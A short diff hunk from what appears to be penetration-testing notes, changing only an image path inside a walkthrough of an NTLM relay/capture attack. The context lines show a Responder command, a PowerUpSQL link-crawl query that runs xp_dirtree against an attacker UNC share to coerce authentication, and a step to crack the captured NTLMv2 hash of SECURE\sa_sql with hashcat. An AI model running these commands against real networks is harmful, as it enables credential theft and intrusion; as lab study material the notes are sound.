@@ -122,7 +122,7 @@ sudo responder -I eth0
 Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -QueryTarget DATA01\DATA
 ```
 
-![](<../../../.gitbook/assets/image (69) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1) (1) (1).png>)
 
 3\. We captured the NTLMV2 hash from `SECURE\sa_sql`. We can try to crack it using hashcat. Save the following in a hash.txt file and run the following hashcat command.
 
